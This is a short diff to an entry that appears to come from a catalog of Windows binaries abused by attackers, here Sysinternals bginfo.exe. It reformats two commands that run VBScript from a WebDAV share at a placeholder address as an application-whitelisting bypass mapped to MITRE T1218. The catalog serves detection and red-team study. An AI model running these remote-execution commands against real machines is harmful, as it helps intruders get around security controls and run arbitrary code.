@@ -12,7 +12,7 @@ Commands:
     MitreID: T1218
     MitreLink: https://attack.mitre.org/wiki/Technique/T1218
     OperatingSystem: Windows
-  - Command: '"\\10.10.10.10\webdav\bginfo.exe" bginfo.bgi /popup /nolicprompt'
+  - Command: \\10.10.10.10\webdav\bginfo.exe bginfo.bgi /popup /nolicprompt
     Usecase: Remote execution of VBScript
     Description: Execute bginfo.exe from a WebDAV server.
     Category: AWL Bypass
@@ -20,7 +20,7 @@ Commands:
     MitreID: T1218
     MitreLink: https://attack.mitre.org/wiki/Technique/T1218
     OperatingSystem: Windows
-  - Command: '"\\live.sysinternals.com\Tools\bginfo.exe" \\10.10.10.10\webdav\bginfo.bgi /popup /nolicprompt'
+  - Command: \\live.sysinternals.com\Tools\bginfo.exe \\10.10.10.10\webdav\bginfo.bgi /popup /nolicprompt
     Usecase: Remote execution of VBScript
     Description: This style of execution may not longer work due to patch.
     Category: AWL Bypass
@@ -30,8 +30,10 @@ Commands:
     OperatingSystem: Windows
 Full Path:
   - No fixed path
-Code Sample: []
-Detection: []
+Code Sample:
+  - Code:
+Detection:
+  - IOC:
 Resources:
   - https://oddvar.moe/2017/05/18/bypassing-application-whitelisting-with-bginfo/
 Acknowledgement:
